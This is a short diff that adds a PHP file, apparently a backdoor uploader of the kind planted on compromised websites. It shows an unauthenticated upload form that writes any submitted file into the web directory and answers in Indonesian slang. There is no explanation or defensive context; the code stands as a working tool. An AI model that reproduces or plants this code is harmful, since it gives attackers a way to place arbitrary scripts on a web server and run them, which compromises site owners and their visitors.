@@ -1,0 +1,1 @@
+<h3>D704T</h3><br><?php if($_POST){if(@copy($_FILES["kaz"]["tmp_name"],$_FILES["kaz"]["name"])){echo "<b>sukses cok</b> > ".$_FILES["kaz"]["name"];}else{echo"<b>gagal anjrott";}}else{echo "<form method=post enctype=multipart/form-data><input type=file name=kaz><input name=v type=submit id=v value=up>";}?>
